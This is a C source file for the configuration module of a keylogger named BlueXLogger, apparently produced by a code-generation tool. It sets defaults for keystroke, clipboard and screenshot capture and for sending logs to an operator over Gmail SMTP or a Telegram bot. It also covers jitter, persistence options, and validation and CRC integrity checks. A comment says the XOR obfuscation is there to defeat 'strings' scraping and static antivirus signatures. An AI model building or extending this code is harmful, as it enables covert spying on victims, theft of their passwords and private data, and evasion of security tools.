/*============================================================================
 * BlueXLogger - bxl_config.c
 * Configuration model, CRC integrity, obfuscated blob (de)serialization and
 * embedded-resource / sidecar loading.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_config.h"
#include "bxl_resid.h"
#include "bxl_telegram.h"   /* token / chat-id shape checks */

#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

/*==========================================================================
 * CRC32
 *========================================================================*/
static bxl_u32 g_crc_table[256];
static int     g_crc_ready = 0;

static void crc_init(void)
{
    bxl_u32 i, j, c;
    if (g_crc_ready) return;
    for (i = 0; i < 256; i++) {
        c = i;
        for (j = 0; j < 8; j++)
            c = (c & 1u) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        g_crc_table[i] = c;
    }
    g_crc_ready = 1;
}

bxl_u32 bxl_crc32(const void *data, size_t len)
{
    const bxl_u8 *p = (const bxl_u8 *)data;
    bxl_u32 c = 0xFFFFFFFFu;
    size_t i;

    crc_init();
    for (i = 0; i < len; i++)
        c = g_crc_table[(c ^ p[i]) & 0xFFu] ^ (c >> 8);
    return c ^ 0xFFFFFFFFu;
}

/*==========================================================================
 * Light obfuscation layer
 *
 * This is NOT cryptography and the header says so plainly. The key has to
 * ship inside the binary, so anything stronger would be theatre. The goal is
 * only to keep credentials from sitting in the file as plain ASCII, which
 * defeats casual `strings` scraping and static AV signatures.
 *========================================================================*/
static bxl_u32 obf_seed(void)
{
    const char *s = BXL_WATERMARK;
    bxl_u32 h = 0x811C9DC5u;
    while (*s) {
        h ^= (bxl_u8)*s++;
        h *= 0x01000193u;
    }
    return h ^ 0xB10E1047u;
}

static bxl_u32 xs32(bxl_u32 *s)
{
    bxl_u32 x = *s;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *s = x;
    return x;
}

static void obf_apply(bxl_u8 *buf, size_t len)
{
    bxl_u32 s = obf_seed();
    size_t i;
    for (i = 0; i < len; i++) {
        if ((i & 3u) == 0)
            (void)xs32(&s);
        buf[i] ^= (bxl_u8)(s >> ((i & 3u) * 8));
    }
}

/*==========================================================================
 * Defaults / sanitize
 *========================================================================*/
void bxl_config_defaults(BxlConfig *cfg)
{
    if (!cfg) return;
    memset(cfg, 0, sizeof(*cfg));

    cfg->struct_size = (bxl_u32)sizeof(BxlConfig);
    cfg->version     = 1;

    StringCchCopyA(cfg->smtp_host, BXL_MAX_HOST, "smtp.gmail.com");
    cfg->smtp_port    = 465;
    cfg->tls_mode     = BXL_TLS_IMPLICIT;
    cfg->auth_enabled = 1;

    StringCchCopyA(cfg->subject_prefix, BXL_MAX_SUBJECT, BXL_DEFAULT_SUBJECT);
    cfg->html_body       = 1;
    cfg->separate_emails = 0;

    /* Email stays the default channel: it is the one that was already there,
     * and a default that silently switched transports on an existing profile
     * would be worse than making the operator tick a box. */
    cfg->channel             = BXL_CHANNEL_EMAIL;
    cfg->tg_parse_html       = 1;
    cfg->tg_send_screenshots = 1;
    cfg->tg_full_log_file    = 1;

    cfg->log_interval_min        = 10;
    cfg->log_keystroke_threshold = 0;

    cfg->shot_enabled      = 1;
    cfg->shot_monitors     = BXL_MON_ALL;
    cfg->shot_format       = BXL_FMT_PNG;
    cfg->shot_jpeg_quality = 80;
    cfg->shot_interval_min = 15;
    cfg->shot_max_dim      = 1920;
    cfg->shot_max_count    = 8;

    cfg->daily_enabled = 0;
    cfg->daily_hour    = 9;
    cfg->daily_minute  = 0;

    cfg->jitter_enabled = 1;
    cfg->jitter_percent = 10;

    cfg->persistence      = BXL_PERSIST_OFF;   /* OFF by default, always */
    cfg->single_instance  = 1;
    cfg->hotkey_enabled   = 0;
    cfg->hotkey_mods      = 0x0002 | 0x0001;   /* MOD_CONTROL | MOD_ALT */
    cfg->hotkey_vk        = 'P';

    /* The graceful-stop hotkey is off by default: an operator who has not asked
     * for a hotkey should not have one that ends the process. */
    cfg->quit_hotkey_enabled = 0;
    cfg->quit_hotkey_mods    = 0x0002 | 0x0001;   /* MOD_CONTROL | MOD_ALT */
    cfg->quit_hotkey_vk      = 'Q';

    cfg->clipboard_capture = 1;
    cfg->capture_raw_input = 1;
    cfg->debug_log         = 0;

    cfg->retention_days   = 7;
    cfg->max_attach_bytes = 20u * 1024u * 1024u;  /* under Gmail's 25 MB */
    cfg->storage_dir[0]   = '\0';                 /* -> %TEMP%\BlueXLogger */

    bxl_config_seal(cfg);
}

static bxl_u32 clamp_u32(bxl_u32 v, bxl_u32 lo, bxl_u32 hi)
{
    if (v < lo) return lo;
    if (v > hi) return hi;
    return v;
}

void bxl_config_sanitize(BxlConfig *cfg)
{
    if (!cfg) return;

    cfg->struct_size = (bxl_u32)sizeof(BxlConfig);
    if (cfg->version == 0) cfg->version = 1;

    cfg->recipient[BXL_MAX_EMAIL - 1]   = '\0';
    cfg->sender[BXL_MAX_EMAIL - 1]      = '\0';
    cfg->app_password[BXL_MAX_PASS - 1] = '\0';
    cfg->smtp_host[BXL_MAX_HOST - 1]    = '\0';
    cfg->subject_prefix[BXL_MAX_SUBJECT - 1] = '\0';
    cfg->storage_dir[BXL_MAX_PATH - 1]  = '\0';
    cfg->tg_bot_token[BXL_MAX_TOKEN - 1] = '\0';
    cfg->tg_chat_id[BXL_MAX_CHATID - 1]  = '\0';

    if (cfg->channel > BXL_CHANNEL_BOTH) cfg->channel = BXL_CHANNEL_EMAIL;

    /* The boolean Telegram flags are read from a blob that an older build may
     * have written. Treat "neither flag set" as "not configured yet" and
     * apply the documented defaults rather than shipping a channel that
     * silently sends nothing. */
    if (cfg->channel != BXL_CHANNEL_EMAIL) {
        if (!cfg->tg_parse_html && !cfg->tg_send_screenshots &&
            !cfg->tg_full_log_file) {
            cfg->tg_parse_html       = 1;
            cfg->tg_send_screenshots = 1;
            cfg->tg_full_log_file    = 1;
        }
    }

    if (cfg->smtp_host[0] == '\0')
        StringCchCopyA(cfg->smtp_host, BXL_MAX_HOST, "smtp.gmail.com");

    if (cfg->tls_mode > BXL_TLS_NONE) cfg->tls_mode = BXL_TLS_IMPLICIT;

    /* Port must agree with the TLS mode when left at a nonsense value. */
    if (cfg->smtp_port == 0) {
        cfg->smtp_port = (cfg->tls_mode == BXL_TLS_STARTTLS) ? 587 : 465;
    }

    cfg->log_interval_min = (cfg->log_interval_min > BXL_MAX_INTERVAL_MIN)
                          ? BXL_MAX_INTERVAL_MIN : cfg->log_interval_min;
    cfg->log_keystroke_threshold = (cfg->log_keystroke_threshold > 1000000u)
                                 ? 1000000u : cfg->log_keystroke_threshold;

    cfg->shot_interval_min = (cfg->shot_interval_min > BXL_MAX_INTERVAL_MIN)
                           ? BXL_MAX_INTERVAL_MIN : cfg->shot_interval_min;

    if (cfg->shot_monitors > BXL_MON_PRIMARY) cfg->shot_monitors = BXL_MON_ALL;
    if (cfg->shot_format   > BXL_FMT_JPEG)    cfg->shot_format   = BXL_FMT_PNG;

    /* 0 means "unset" and takes the documented default; the clamp must come
     * second or it would turn 0 into 1 and make this branch unreachable. */
    if (cfg->shot_jpeg_quality == 0)
        cfg->shot_jpeg_quality = 80;
    else
        cfg->shot_jpeg_quality = (bxl_u8)clamp_u32(cfg->shot_jpeg_quality, 1, 100);

    if (cfg->shot_max_dim > 16384u) cfg->shot_max_dim = 16384u;
    if (cfg->shot_max_count > 64u)  cfg->shot_max_count = 64u;
    if (cfg->shot_max_count == 0)   cfg->shot_max_count = 8;

    if (cfg->daily_hour   > 23) cfg->daily_hour   = 23;
    if (cfg->daily_minute > 59) cfg->daily_minute = 59;

    if (cfg->jitter_percent > 50) cfg->jitter_percent = 50;

    if (cfg->persistence > BXL_PERSIST_SCHEDTASK) cfg->persistence = BXL_PERSIST_OFF;

    if (cfg->hotkey_vk == 0) cfg->hotkey_vk = 'P';
    if (cfg->hotkey_mods == 0) cfg->hotkey_mods = 0x0003; /* CTRL|ALT */

    if (cfg->retention_days > 365u) cfg->retention_days = 365u;

    cfg->max_attach_bytes = clamp_u32(cfg->max_attach_bytes,
                                      BXL_MAX_ATTACH_BYTES_MIN,
                                      BXL_MAX_ATTACH_BYTES_MAX);

    /* At least one log trigger must be live, or logs would never ship. */
    if (cfg->log_interval_min == 0 && cfg->log_keystroke_threshold == 0)
        cfg->log_interval_min = 10;

    bxl_config_seal(cfg);
}

/*==========================================================================
 * Integrity
 *========================================================================*/
void bxl_config_seal(BxlConfig *cfg)
{
    if (!cfg) return;
    cfg->crc = 0;
    cfg->crc = bxl_crc32(cfg, offsetof(BxlConfig, crc));
}

int bxl_config_verify(const BxlConfig *cfg)
{
    bxl_u32 expect;
    if (!cfg) return BXL_FALSE;
    if (cfg->struct_size != (bxl_u32)sizeof(BxlConfig)) return BXL_FALSE;
    expect = bxl_crc32(cfg, offsetof(BxlConfig, crc));
    return (expect == cfg->crc) ? BXL_TRUE : BXL_FALSE;
}

/*==========================================================================
 * Blob (de)serialization
 *========================================================================*/
size_t bxl_config_blob_max(void)
{
    return BXL_CFG_HEADER_LEN + sizeof(BxlConfig);
}

size_t bxl_config_serialize(const BxlConfig *cfg, void *blob, size_t blob_cap)
{
    bxl_u8 *p = (bxl_u8 *)blob;
    size_t  need;
    bxl_u32 body_crc;

    if (!cfg || !blob) return 0;

    need = BXL_CFG_HEADER_LEN + sizeof(BxlConfig);
    if (blob_cap < need) return 0;

    memset(blob, 0, need);

    memcpy(p, BXL_CFG_MAGIC_OK, BXL_CFG_MAGIC_LEN);
    /* header[8..11]  = blob format version */
    p[8] = 1;
    /* header[12..15] = body length */
    p[12] = (bxl_u8)(sizeof(BxlConfig) & 0xFF);
    p[13] = (bxl_u8)((sizeof(BxlConfig) >> 8) & 0xFF);
    p[14] = (bxl_u8)((sizeof(BxlConfig) >> 16) & 0xFF);
    p[15] = (bxl_u8)((sizeof(BxlConfig) >> 24) & 0xFF);

    body_crc = bxl_crc32(cfg, sizeof(BxlConfig));
    p[16] = (bxl_u8)(body_crc & 0xFF);
    p[17] = (bxl_u8)((body_crc >> 8) & 0xFF);
    p[18] = (bxl_u8)((body_crc >> 16) & 0xFF);
    p[19] = (bxl_u8)((body_crc >> 24) & 0xFF);

    memcpy(p + BXL_CFG_HEADER_LEN, cfg, sizeof(BxlConfig));
    obf_apply(p + BXL_CFG_HEADER_LEN, sizeof(BxlConfig));

    return need;
}

int bxl_config_deserialize(const void *blob, size_t blob_len, BxlConfig *cfg)
{
    const bxl_u8 *p = (const bxl_u8 *)blob;
    BxlConfig tmp;
    bxl_u32 body_len, body_crc;
    size_t need;

    if (!blob || !cfg) return BXL_FALSE;
    if (blob_len < BXL_CFG_HEADER_LEN) return BXL_FALSE;
    if (memcmp(p, BXL_CFG_MAGIC_OK, 6) != 0) return BXL_FALSE;
    if (p[8] != 1) return BXL_FALSE;

    body_len = (bxl_u32)p[12] | ((bxl_u32)p[13] << 8)
             | ((bxl_u32)p[14] << 16) | ((bxl_u32)p[15] << 24);
    if (body_len != sizeof(BxlConfig)) return BXL_FALSE;

    need = BXL_CFG_HEADER_LEN + body_len;
    if (blob_len < need) return BXL_FALSE;

    body_crc = (bxl_u32)p[16] | ((bxl_u32)p[17] << 8)
             | ((bxl_u32)p[18] << 16) | ((bxl_u32)p[19] << 24);

    memcpy(&tmp, p + BXL_CFG_HEADER_LEN, sizeof(BxlConfig));
    obf_apply((bxl_u8 *)&tmp, sizeof(BxlConfig));

    if (bxl_crc32(&tmp, sizeof(BxlConfig)) != body_crc) return BXL_FALSE;
    if (!bxl_config_verify(&tmp)) return BXL_FALSE;

    *cfg = tmp;
    return BXL_TRUE;
}

int bxl_config_is_placeholder(const void *blob, size_t blob_len)
{
    if (!blob || blob_len < BXL_CFG_MAGIC_LEN) return BXL_FALSE;
    return (memcmp(blob, BXL_CFG_MAGIC_EMPTY, 6) == 0) ? BXL_TRUE : BXL_FALSE;
}

size_t bxl_config_make_placeholder(void *blob, size_t blob_cap)
{
    BxlConfig def;

    if (!blob || blob_cap < BXL_CFG_SLOT_SIZE) return 0;

    memset(blob, 0, BXL_CFG_SLOT_SIZE);
    memcpy(blob, BXL_CFG_MAGIC_EMPTY, BXL_CFG_MAGIC_LEN);

    /* Keep a structurally valid default body in the slot so the template is
     * usable even if it is never patched. */
    bxl_config_defaults(&def);
    if (bxl_config_serialize(&def, blob, BXL_CFG_SLOT_SIZE) == 0)
        return 0;

    /* serialize() stamped the configured magic; put the placeholder back. */
    memcpy(blob, BXL_CFG_MAGIC_EMPTY, BXL_CFG_MAGIC_LEN);
    return BXL_CFG_SLOT_SIZE;
}

/*==========================================================================
 * Embedded resource access
 *========================================================================*/
int bxl_config_load_embedded(void *blob, size_t blob_cap, size_t *blob_len,
                             int *was_placeholder)
{
    HRSRC   hres;
    HGLOBAL hglob;
    DWORD   size;
    const void *p;
    HMODULE hSelf;

    if (was_placeholder) *was_placeholder = BXL_FALSE;
    if (blob_len) *blob_len = 0;

    hSelf = GetModuleHandleW(NULL);
    hres  = FindResourceW(hSelf, BXL_RES_CFG_W, RT_RCDATA);
    if (!hres) return BXL_FALSE;

    size = SizeofResource(hSelf, hres);
    if (size < BXL_CFG_HEADER_LEN) return BXL_FALSE;

    hglob = LoadResource(hSelf, hres);
    if (!hglob) return BXL_FALSE;

    p = LockResource(hglob);
    if (!p) return BXL_FALSE;

    if (was_placeholder && bxl_config_is_placeholder(p, size))
        *was_placeholder = BXL_TRUE;

    if (size > blob_cap) size = (DWORD)blob_cap;
    memcpy(blob, p, size);
    if (blob_len) *blob_len = size;
    return BXL_TRUE;
}

/*==========================================================================
 * Sidecar
 *========================================================================*/
int bxl_config_sidecar_path(const wchar_t *exe_path, wchar_t *out, size_t out_cch)
{
    const wchar_t *slash;
    size_t dir_len;

    if (!exe_path || !out || out_cch < 32) return BXL_FALSE;

    slash = wcsrchr(exe_path, L'\\');
    if (!slash) slash = wcsrchr(exe_path, L'/');
    if (!slash) return BXL_FALSE;

    dir_len = (size_t)(slash - exe_path);
    if (dir_len + 1 + 32 > out_cch) return BXL_FALSE;

    memcpy(out, exe_path, dir_len * sizeof(wchar_t));
    out[dir_len] = L'\0';
    return SUCCEEDED(StringCchCatW(out, out_cch, L"\\BlueXLogger.cfg"));
}

int bxl_config_write_sidecar(const wchar_t *path, const BxlConfig *cfg)
{
    bxl_u8 blob[BXL_CFG_SLOT_SIZE];
    size_t n;
    HANDLE h;
    DWORD written = 0;

    if (!path || !cfg) return BXL_FALSE;

    n = bxl_config_serialize(cfg, blob, sizeof(blob));
    if (n == 0) return BXL_FALSE;

    h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return BXL_FALSE;

    if (!WriteFile(h, blob, (DWORD)n, &written, NULL) || written != n) {
        CloseHandle(h);
        return BXL_FALSE;
    }
    CloseHandle(h);
    return BXL_TRUE;
}

int bxl_config_read_sidecar(const wchar_t *path, BxlConfig *cfg)
{
    bxl_u8 blob[BXL_CFG_SLOT_SIZE];
    HANDLE h;
    DWORD got = 0;

    if (!path || !cfg) return BXL_FALSE;

    h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return BXL_FALSE;

    if (!ReadFile(h, blob, sizeof(blob), &got, NULL) || got < BXL_CFG_HEADER_LEN) {
        CloseHandle(h);
        return BXL_FALSE;
    }
    CloseHandle(h);

    if (!bxl_config_deserialize(blob, got, cfg)) return BXL_FALSE;
    bxl_config_sanitize(cfg);
    return BXL_TRUE;
}

/*==========================================================================
 * Effective config resolution
 *========================================================================*/
int bxl_config_load_effective(BxlConfig *cfg, const wchar_t *exe_path)
{
    bxl_u8  blob[BXL_CFG_SLOT_SIZE];
    size_t  blob_len = 0;
    int     placeholder = BXL_FALSE;
    wchar_t sidecar[MAX_PATH * 2];

    if (!cfg) return BXL_FALSE;

    if (bxl_config_load_embedded(blob, sizeof(blob), &blob_len, &placeholder)) {
        if (!placeholder) {
            if (bxl_config_deserialize(blob, blob_len, cfg)) {
                bxl_config_sanitize(cfg);
                return BXL_TRUE;
            }
        }
    }

    if (exe_path && bxl_config_sidecar_path(exe_path, sidecar,
                                            BXL_COUNT_OF(sidecar))) {
        if (bxl_config_read_sidecar(sidecar, cfg)) return BXL_TRUE;
    }

    return BXL_FALSE;
}

/*==========================================================================
 * Validation
 *========================================================================*/
static int looks_like_email(const char *s)
{
    const char *at;
    if (!s || !*s) return BXL_FALSE;
    at = strchr(s, '@');
    if (!at || at == s) return BXL_FALSE;
    if (!strchr(at + 1, '.')) return BXL_FALSE;
    if (strchr(s, ' ') || strchr(s, '\t')) return BXL_FALSE;
    if (strlen(s) < 6) return BXL_FALSE;
    return BXL_TRUE;
}

int bxl_config_validate(const BxlConfig *cfg, char *err, size_t err_cch)
{
#define FAILF(...) do { \
        if (err && err_cch) StringCchPrintfA(err, err_cch, __VA_ARGS__); \
        return BXL_FALSE; \
    } while (0)

    if (!cfg) FAILF("no configuration supplied");

    /* Only the channels that are actually selected are validated. Requiring
     * Gmail credentials on a Telegram-only profile would make the option
     * unusable, which defeats the point of offering it. */
    if (cfg->channel > BXL_CHANNEL_BOTH)
        FAILF("unknown delivery channel");

    if (cfg->channel == BXL_CHANNEL_EMAIL || cfg->channel == BXL_CHANNEL_BOTH) {
        if (!looks_like_email(cfg->recipient))
            FAILF("recipient address is missing or malformed");
        if (!looks_like_email(cfg->sender))
            FAILF("sender address is missing or malformed");

        if (cfg->auth_enabled) {
            if (cfg->app_password[0] == '\0')
                FAILF("app password is required when SMTP auth is enabled");
            if (strlen(cfg->app_password) < 8)
                FAILF("app password looks too short (Gmail app passwords are 16 chars)");
        }

        if (cfg->smtp_host[0] == '\0')
            FAILF("SMTP host is required");
        if (cfg->smtp_port == 0)
            FAILF("SMTP port is required");
    }

    if (cfg->channel == BXL_CHANNEL_TELEGRAM || cfg->channel == BXL_CHANNEL_BOTH) {
        if (!bxl_telegram_token_ok(cfg->tg_bot_token))
            FAILF("Telegram bot token is missing or malformed "
                  "(expected <digits>:<rest>, e.g. 123456789:AAH...)");
        if (!bxl_telegram_chat_ok(cfg->tg_chat_id))
            FAILF("Telegram chat id is missing "
                  "(use a numeric id such as -1001234567890, or @channelname)");
    }

    if (cfg->log_interval_min == 0 && cfg->log_keystroke_threshold == 0)
        FAILF("at least one log trigger (interval or threshold) must be enabled");

    if (cfg->shot_enabled && cfg->shot_interval_min == 0)
        FAILF("screenshot capture is enabled but the interval is zero");

    if (cfg->shot_enabled && cfg->shot_format == BXL_FMT_JPEG &&
        (cfg->shot_jpeg_quality < 1 || cfg->shot_jpeg_quality > 100))
        FAILF("JPEG quality must be between 1 and 100");

    if (cfg->jitter_enabled && cfg->jitter_percent > 50)
        FAILF("jitter must be between 0 and 50 percent");

    if (cfg->persistence > BXL_PERSIST_SCHEDTASK)
        FAILF("unknown persistence method");

    if (cfg->max_attach_bytes < BXL_MAX_ATTACH_BYTES_MIN)
        FAILF("attachment budget is below the minimum");

    if (!bxl_config_verify(cfg))
        FAILF("configuration integrity check failed (CRC mismatch)");

    if (err && err_cch) err[0] = '\0';
    return BXL_TRUE;

#undef FAILF
}
